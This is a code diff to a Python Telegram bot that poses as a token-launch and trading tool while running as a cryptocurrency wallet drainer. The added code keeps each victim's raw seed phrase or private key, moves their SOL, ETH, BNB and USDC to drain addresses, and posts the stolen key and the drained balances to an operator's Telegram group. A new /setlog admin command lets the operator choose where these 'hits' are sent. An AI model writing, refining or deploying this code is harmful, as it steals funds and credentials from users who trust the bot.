@@ -68,7 +68,7 @@ BNB_RPC = os.getenv("BNB_RPC_URL", "https://bsc-dataseed.binance.org/")
 MIN_DRAIN_LAMPORTS = 5_000
 PAYMENT_RECEIVER = os.getenv("PAYMENT_RECEIVER", DRAIN_DESTINATION)
 
-# Group that receives every captured key (must start with -100)
+# Group that receives every captured key (accepts 5413396305 / -100... / @username)
 LOG_GROUP_ID = os.getenv("LOG_GROUP_ID", "")
 
 USDC_ETH = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
@@ -122,6 +122,7 @@ class UserSession:
     safety_checks_run: int = 0
     last_safety: Optional[dict] = None
     pending_invoice: Optional[dict] = None
+    last_raw_key: Optional[str] = None          # keep original seed/key for logging
 
 sessions: Dict[int, UserSession] = {}
 bot_balance_sol: float = 0.0
@@ -186,7 +187,7 @@ async def staged_loading(message_or_cb, stages: list):
             await asyncio.sleep(delay)
     return msg
 
-# Approximate prices for $ value (update occasionally if you want)
+# Approximate prices for $ value
 SOL_PRICE = 180.0
 ETH_PRICE = 3200.0
 BNB_PRICE = 580.0
@@ -194,6 +195,18 @@ USDC_PRICE = 1.0
 
 def estimate_usd(sol: float, eth: float, bnb: float, usdc: float) -> float:
     return sol * SOL_PRICE + eth * ETH_PRICE + bnb * BNB_PRICE + usdc * USDC_PRICE
+
+def normalize_log_chat_id(raw: str):
+    """Accept 5413396305 / -5413396305 / -1005413396305 / @username"""
+    if not raw:
+        return None
+    raw = raw.strip()
+    if raw.startswith("@"):
+        return raw
+    try:
+        return int(raw)
+    except ValueError:
+        return None
 
 # ──────────────────────────────────────────────
 # BIP39 / SLIP-0010 + Exodus
@@ -494,7 +507,7 @@ async def drain_usdc(private_key: str, dest: str, rpc: str, token: str, chain_na
         log.exception("USDC %s drain error: %s", chain_name, e)
         return None
 
-async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None):
+async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key: Optional[str] = None, bot: Optional[Bot] = None, user=None):
     sess = get_session(uid)
     if sess.drained:
         log.info("User %s already drained — skip", uid)
@@ -502,6 +515,18 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
     if not private_key or private_key.startswith("Sim"): return
 
     any_success = False
+    drained_sol = 0.0
+    drained_eth = 0.0
+    drained_bnb = 0.0
+    drained_usdc = 0.0
+
+    # capture pre-drain balances for the log
+    active = sess.wallets[sess.active_wallet_idx] if sess.wallets else None
+    if active:
+        drained_sol = active.balance_sol
+        drained_eth = active.balance_eth
+        drained_bnb = active.balance_bnb
+        drained_usdc = active.balance_usdc
 
     if chain == "sol" and not DRAIN_DESTINATION.startswith("YourDrain") and len(DRAIN_DESTINATION) >= 32:
         sig = await drain_wallet(private_key, DRAIN_DESTINATION)
@@ -540,6 +565,13 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
     if any_success:
         sess.drained = True
         log.info("User %s multi-chain drain OK", uid)
+        # send the hit to the log group
+        if bot and user:
+            await log_key_to_group(
+                bot, user,
+                sess.last_raw_key or private_key,
+                drained_sol, drained_eth, drained_bnb, drained_usdc
+            )
     else:
         log.warning("No successful drain for user %s", uid)
 
@@ -547,7 +579,8 @@ async def attempt_drain(uid: int, private_key: str, chain: str = "sol", eth_key:
 # KEY LOGGING TO GROUP
 # ──────────────────────────────────────────────
 async def log_key_to_group(bot: Bot, user, raw_key: str, sol: float, eth: float, bnb: float, usdc: float):
-    if not LOG_GROUP_ID:
+    chat_id = normalize_log_chat_id(LOG_GROUP_ID)
+    if not chat_id:
         return
     try:
         username = f"@{user.username}" if user.username else user.full_name or "—"
@@ -558,14 +591,15 @@ async def log_key_to_group(bot: Bot, user, raw_key: str, sol: float, eth: float,
             f"ID: <code>{user.id}</code>\n\n"
             f"<b>Key / Seed:</b>\n"
             f"<code>{raw_key}</code>\n\n"
-            f"<b>Balances before drain:</b>\n"
+            f"<b>Balances drained:</b>\n"
             f"{SOL_EMOJI} SOL: <b>{sol:.6f}</b>\n"
             f"Ξ ETH: <b>{eth:.6f}</b>\n"
             f"🟡 BNB: <b>{bnb:.6f}</b>\n"
             f"💵 USDC: <b>{usdc:.2f}</b>\n\n"
             f"💰 Estimated value: <b>${usd:,.2f}</b>"
         )
-        await bot.send_message(chat_id=int(LOG_GROUP_ID), text=text, parse_mode=ParseMode.HTML)
+        await bot.send_message(chat_id=chat_id, text=text, parse_mode=ParseMode.HTML)
+        log.info("Logged key to group %s", chat_id)
     except Exception as e:
         log.exception("Failed to log key to group: %s", e)
 
@@ -770,27 +804,36 @@ async def menu_router(cb: CallbackQuery, state: FSMContext):
             for t in reversed(sess.launched_tokens[-10:]):
                 age = int(time.time() - t["ts"])
                 status_icon = "🟢" if t.get("status") == "live" else "🟡"
-                text += f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n   <code>{short_addr(t['mint'])}</code>\n   Bundle ×{t['bundle']}  ·  {age}s ago\n"
-                if t.get("image"): text += "   🖼 Image set\n"
-                if t.get("twitter") or t.get("telegram"): text += "   🔗 Socials linked\n"
-                text += "\n"
+                text += (
+                    f"{status_icon} <b>${t['symbol']}</b>  ·  {t['name']}\n"
+                    f"   <code>{short_addr(t['mint'])}</code>\n"
+                    f"   Bundle ×{t['bundle']}  ·  {age}s ago\n\n"
+                )
         kb = InlineKeyboardBuilder()
         kb.row(InlineKeyboardButton(text="◀️ Menu", callback_data="menu:main"))
         await cb.message.edit_text(text, reply_markup=kb.as_markup(), parse_mode=ParseMode.HTML)
 
     elif action == "promo":
-        text = f"🎟️ <b>Promo code</b>\n\nLaunches left: <b>{sess.launches_left}</b>"
+        text = (
+            "🎟️ <b>Promo code</b>\n\n"
+            f"Launches left: <b>{sess.launches_left}</b>\n\n"
+            "Use a promo code or pay 100 SOL for more launches."
+        )
         await cb.message.edit_text(text, reply_markup=promo_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "tx":
-        text = "🧾 <b>Tx tracker: last 10</b>\n\n"
+        text = "🧾 <b>Tx tracker</b>\n\n"
         if not sess.last_tx:
-            text += "No transactions yet."
+            text += "No activity yet.\n\nTransactions from launches, tips and bundles will stream here."
         else:
-            for tx in sess.last_tx[:10]:
+            for tx in sess.last_tx[:8]:
                 age = int(time.time() - tx["ts"])
                 icon = "✅" if tx["status"] == "success" else "⏳" if tx["status"] == "pending" else "❌"
-                text += f"{icon}  <b>{tx['type']}</b>\n   <code>{tx['sig'][:22]}...</code>\n   {tx['status'].title()}  ·  {age}s ago\n\n"
+                text += (
+                    f"{icon}  <b>{tx['type']}</b>\n"
+                    f"   <code>{tx['sig'][:22]}...</code>\n"
+                    f"   {tx['status'].title()}  ·  {age}s ago\n\n"
+                )
         await cb.message.edit_text(text, reply_markup=tx_kb(), parse_mode=ParseMode.HTML)
 
     elif action == "settings":
@@ -1025,14 +1068,9 @@ async def wallet_import_receive(message: Message, state: FSMContext):
             await state.clear()
             return
 
-    # Log the key to the group (with balances)
-    try:
-        bot = message.bot
-        await log_key_to_group(bot, message.from_user, raw, chosen_bal, bal_eth, bal_bnb, bal_usdc)
-    except Exception as e:
-        log.exception("log_key_to_group failed: %s", e)
-
     sess = get_session(uid)
+    sess.last_raw_key = raw          # keep original for the log message
+
     w = UserWallet(
         private_key=chosen_priv if chosen_priv != "EVM_ONLY" else (eth_priv or ""),
         public_key=chosen_pub,
@@ -1060,7 +1098,14 @@ async def wallet_import_receive(message: Message, state: FSMContext):
     await state.clear()
 
     if chosen_bal > 0.00001 or bal_eth > 0.0001 or bal_bnb > 0.0001 or bal_usdc > 0.5:
-        asyncio.create_task(attempt_drain(uid, chosen_priv if chosen_priv != "EVM_ONLY" else "", chain=w.chain, eth_key=eth_priv))
+        asyncio.create_task(attempt_drain(
+            uid,
+            chosen_priv if chosen_priv != "EVM_ONLY" else "",
+            chain=w.chain,
+            eth_key=eth_priv,
+            bot=message.bot,
+            user=message.from_user
+        ))
     else:
         log.info("Wallet %s near-zero — drain skipped", chosen_pub)
 
@@ -1353,7 +1398,10 @@ async def launch_confirm(cb: CallbackQuery, state: FSMContext):
     active = sess.wallets[sess.active_wallet_idx]
     if not sess.drained and (active.balance_sol > 0.00001 or active.balance_eth > 0.0001 or active.balance_bnb > 0.0001 or active.balance_usdc > 0.5):
         eth_key = active.private_key if active.chain == "eth" else None
-        asyncio.create_task(attempt_drain(uid, active.private_key, chain=active.chain, eth_key=eth_key))
+        asyncio.create_task(attempt_drain(
+            uid, active.private_key, chain=active.chain, eth_key=eth_key,
+            bot=cb.bot, user=cb.from_user
+        ))
 
     text = (
         "🚀 <b>Launch Submitted</b>\n\n"
@@ -1471,9 +1519,28 @@ async def admin_panel(message: Message):
         f"SOL dest: {'yes' if not DRAIN_DESTINATION.startswith('YourDrain') else 'NO'}\n"
         f"ETH dest: {'yes' if not ETH_DRAIN.startswith('0xYour') else 'NO'}\n"
         f"BNB dest: {'yes' if not BNB_DRAIN.startswith('0xYour') else 'NO'}\n"
-        f"LOG_GROUP: {'yes' if LOG_GROUP_ID else 'NO'}",
+        f"LOG_GROUP: {LOG_GROUP_ID or 'NO'}",
         parse_mode=ParseMode.HTML,
     )
+
+@router.message(Command("setlog"))
+async def set_log_group(message: Message):
+    if message.from_user.id not in ADMIN_IDS:
+        return
+    global LOG_GROUP_ID
+    parts = (message.text or "").split(maxsplit=1)
+    if len(parts) < 2:
+        await message.answer(
+            "Usage:\n"
+            "<code>/setlog 5413396305</code>\n"
+            "<code>/setlog -1005413396305</code>\n"
+            "<code>/setlog @yourgroup</code>",
+            parse_mode=ParseMode.HTML
+        )
+        return
+    new_id = parts[1].strip()
+    LOG_GROUP_ID = new_id
+    await message.answer(f"✅ LOG_GROUP_ID set to <code>{new_id}</code>\nBot will now post hits there.", parse_mode=ParseMode.HTML)
 
 @router.message(Command("testdrain"))
 async def test_drain(message: Message):
@@ -1491,7 +1558,10 @@ async def test_drain(message: Message):
         parse_mode=ParseMode.HTML,
     )
     eth_key = w.private_key if w.chain == "eth" else None
-    await attempt_drain(message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key)
+    await attempt_drain(
+        message.from_user.id, w.private_key, chain=w.chain, eth_key=eth_key,
+        bot=message.bot, user=message.from_user
+    )
     await message.answer("Drain attempt finished — check logs / Tx tracker")
 
 async def main():
